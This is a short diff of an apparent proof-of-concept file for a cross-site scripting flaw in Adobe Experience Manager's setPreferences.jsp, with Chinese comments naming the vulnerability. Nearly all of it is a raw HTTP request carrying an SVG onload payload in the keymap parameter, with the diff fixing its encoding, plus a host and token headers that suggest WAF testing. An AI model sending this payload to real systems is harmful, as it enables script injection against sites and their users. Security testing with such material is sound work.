@@ -1,7 +1,6 @@
 # Adobe Experience Manager 跨站脚本漏洞#1
 # Adobe Experience Manager通过setPreferences包含跨站点脚本漏洞。
-GET /crx/de/setPreferences.jsp;
-.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a&acid=80050897&bid=hd_tag_m8mv24jn HTTP/1.1
+GET /crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a&acid=80050897&bid=hd_tag_m8mv24jn HTTP/1.1
 Host: www.swaf.com
 RM-PRO-BusinessID: hd_tag_m8mv24jn
 RM-PRO-Token: 769436c0d1a9662d1612cbe2a54ab60a
